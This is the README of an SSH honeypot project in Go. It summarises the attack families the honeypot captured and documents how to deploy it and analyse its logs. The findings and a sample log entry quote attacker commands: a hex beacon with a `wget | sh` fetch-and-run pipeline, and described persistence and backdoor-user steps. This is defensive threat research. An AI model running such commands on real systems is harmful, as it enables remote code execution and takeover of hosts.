# ssh-honeypot

![CI](https://github.com/Am1ne-bou/ssh-honeypot/actions/workflows/ci.yml/badge.svg)

Low-interaction SSH honeypot in Go. Listens on port 22, logs every auth attempt,
accepts attackers into a fake Linux shell, and records everything they do.

Built to sit on a real public VPS and collect attack data -- what credentials bots
try, what recon they run, what payloads they attempt to drop.

## findings (163+ hours, Helsinki VPS)

Full analysis in [FINDINGS.md](FINDINGS.md).

4005 auth attempts from 233+ source IPs. 1217 sessions accepted. 11 attack families identified.
Almost all clients identify as `SSH-2.0-Go` -- mass scanners built on the Go SSH library.

Top passwords: `123456`, `admin`, `postgres`, `password`, `1234`.

**1. Credential stuffing** -- wordlist spray, RockYou-based. One IP tried 1545 unique
passwords then kept going 1382 more times after getting in. Also saw a Chinese breach
dataset: dates like `19870825` mixed with romanized names.

**2. Diicot / GPU miner** -- ~180 sessions. Checks GPU via `lspci` and `nvidia-smi`,
locks `authorized_keys` with `chattr -i` (immutable even to root), kills competing
miners. The fake Tesla T4 in the lspci output triggered the full deployment.

**3. SCP dropper** -- tried 11 directories looking for a writable path via `scp -t`.
The honeypot speaks the SCP wire protocol so the bot thought it succeeded.

**4. Password changer** -- changes root password to `chpasswd` to lock out other
attackers. Classic competitive exclusion.

**5. C2 dropper (fileless)** -- `auth_ok` hex beacon + `wget|sh` pipeline. Nothing
written to disk. Runs via SSH exec channel, invisible to shell-based logging.

**6. w.sh / astats persistence bot** -- cron AND systemd user service simultaneously.
Process names (`astats`, `netai`, `kstats`) disguised as monitoring tools.

**7. VPS infrastructure scout** -- 35 commands, no payload. Includes a `dd` disk
benchmark to assess mining suitability before deciding to deploy.

**8. SSHCHK liveness checker** -- structured C2 probe with BEGIN/END token framing
and an arithmetic proof-of-work (`echo $((7*191+3))` must return 1340). Confirms
a real shell before sending a payload.

**9. Minimal OS scanner** -- just `uname -s -m`, disconnects. Pure cataloguing.

**10. ELF echo injector** -- 78 minutes, one SSH connection, 43,058 `echo -e -n`
commands writing four binaries byte by byte when downloads failed:

```
amd64  -- 5MB, 64-bit Go, stripped
kal64  -- 3MB, 64-bit Go, stripped
kswpad -- 1.2MB, ELF 32-bit x86
linux  -- 1.3MB, ELF 32-bit x86, UPX packed
```
I still need to properly analyse them - planning to use Ghidra learn it first but when i will have more time.

**11. Meow dropper** -- downloads `meow` (x86) and `meowarm64` (ARM) from a single C2,
creates two backdoor sudo users (`admin1`, `user1`) with password `modzmodz`, writes
a root credential string to `/tmp/mew`. Entire kill chain in one exec command.
Binary analysis pending.

---

## architecture

```
attacker --> TCP :22 --> iptables REDIRECT --> :2222 --> honeypot process
                                                         |
                                             /var/lib/honeypot/logs/
                                               auth.log     (every auth attempt)
                                               session.log  (commands, exec, SCP)
                                               server.log   (startup, config)

operator --> TCP :VPS_PORT --> real OpenSSH
```

Three JSON log files, one event per line:

- `auth.log` -- every login attempt: IP, user, password, client banner, attempt number, outcome
- `session.log` -- handshakes, channel requests, commands (both interactive shell and SSH exec)
- `server.log` -- startup with config snapshot (auth_threshold, addr), errors

## auth behavior

Configurable via `-auth-threshold N` (default 1 -- accept immediately).

With `N=1` every bot gets a shell on the first attempt. With `N=10` the server
harvests up to 9 passwords per IP before accepting. The attempt counter accumulates
across connections keyed by source IP (not IP:port) since bots open a fresh TCP
connection per guess.

The threshold and a timestamp are logged at startup in `server.log`, which the
period analysis tool uses to compare behavior across deployments.

## build

```bash
make build
```

Produces a static Linux binary. Needs Go 1.22+. Cross-compiles from any OS.

```bash
GOOS=linux GOARCH=amd64 CGO_ENABLED=0 go build -o ssh-honeypot .
```

## deploy

Move real sshd to a non-standard port first. In `/etc/ssh/sshd_config`:

```
Port VPS_PORT
```

Restart sshd, **verify you can still connect on VPS_PORT before doing anything else.**

Redirect port 22 to the honeypot:

```bash
iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 2222
iptables-save > /etc/iptables/rules.v4
```

Service user and directories:

```bash
useradd -r -s /sbin/nologin -d /var/lib/honeypot honeypot
mkdir -p /var/lib/honeypot/logs /var/lib/honeypot/quarantine
chown -R honeypot:honeypot /var/lib/honeypot
```

Copy binary and systemd unit:

```bash
scp -P <port> -i ~/.ssh/your_key ssh-honeypot user@VPS:/tmp/ssh-honeypot
ssh -p <port> -i ~/.ssh/your_key user@VPS \
  "sudo install -m 755 /tmp/ssh-honeypot /usr/local/bin/ssh-honeypot && \
   sudo systemctl restart ssh-honeypot"
```

Verify the new binary is running (look for `auth_threshold` in the listening line):

```bash
ssh -p <port> -i ~/.ssh/your_key user@VPS \
  "cat /var/lib/honeypot/logs/server.log | tail -3"
```

## flags

```
-addr            listen address                    (default :2222)
-host-key        ed25519 host key file             (default ./host.key)
-log-dir         log file directory                (default ./logs)
-quarantine-dir  payload capture directory         (default "" = disabled)
-max-conn        concurrent connection cap         (default 100)
-auth-threshold  accept after N attempts per IP    (default 1)
```

The host key is generated on first run and reused across restarts. A key that changes
on every restart is a fingerprinting tell -- scanners notice.

## logs

`auth.log` entry:

```json
{"time":"2026-05-27T05:03:14Z","level":"INFO","msg":"auth attempt","method":"password","user":"root","password":"123456","remote":"35.200.201.144:54321","client":"SSH-2.0-Go","attempt":1,"outcome":"accepted"}
```

`session.log` has two types of command entries:

```json
{"time":"2026-05-27T05:03:14Z","level":"INFO","msg":"shell","sid":"dc727dd9b3","command":"uname -s -v -n -r -m"}
{"time":"2026-05-29T10:24:55Z","level":"INFO","msg":"exec","sid":"5d9fcafd","command":"uname -a; echo -e \"\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A\"; (wget ... | sh -s ssh)"}
```

`msg=shell` is an interactive shell command. `msg=exec` is a one-shot SSH exec (no PTY).
Most automated bots use exec -- analysis scripts must count both.

`server.log` startup entry:

```json
{"time":"2026-05-29T06:15:23Z","level":"INFO","msg":"listening","addr":":2222","auth_threshold":1}
```

## analysis

Pull logs from VPS:

```bash
mkdir -p ~/honeypot-logs/$(date +%Y-%m-%d)
scp -P <port> -i ~/.ssh/your_key \
  "user@VPS:/var/lib/honeypot/logs/*.log" \
  ~/honeypot-logs/$(date +%Y-%m-%d)/
```

Run all scripts at once:

```bash
./analyze.sh ~/honeypot-logs/2026-05-29
```

Produces five files: `result-HHMM--DD-MM-{report,full-stats,session,timeline,periods}.txt`.

Individual scripts:

```bash
python3 analysis/report.py   ./logs  # heatmap, top passwords, session narratives, alerts
python3 analysis/stats.py    ./logs  # raw counts + full password list
python3 analysis/sessions.py ./logs  # per-session event timeline
python3 analysis/timeline.py ./logs  # first/last-seen per command and password
python3 analysis/periods.py  ./logs  # compare periods across server restarts / threshold changes
```

`periods.py` reads `server.log` for restart timestamps and `auth_threshold` values,
slices auth and session logs by period, and prints a side-by-side comparison. Useful
for measuring the effect of config changes (e.g. threshold=10 vs threshold=1).

## fake shell

Handles ~60 commands: `whoami`, `id`, `uname`, `ls`, `cat`, `ps`, `ifconfig`,
`nvidia-smi`, `curl`, `wget`, `sudo`, and more. Returns plausible output for
Ubuntu 24.04 with a Tesla T4 GPU and 8 CPU cores.

Supported shell features:

- Pipes: `nvidia-smi -q | grep "Product Name" | wc -l` returns `1`
- `&&` chaining: stops on first non-zero exit
- `> /dev/null` redirect stripping
- `$VAR` / `${VAR}` expansion
- Per-session virtual filesystem: `mkdir /tmp/x` then `ls /tmp` shows it
- SCP receive: speaks wire protocol, acks uploads, writes to session FS

With `--quarantine-dir` set, SCP payloads are saved as `<sha256>-<name>.bin`
(read-only, 50 MB cap per file).

Known limitations:

- no `$(cmd)` substitution
- network commands return canned output, no real traffic sent
- `> file` writes (other than `/dev/null`) not implemented
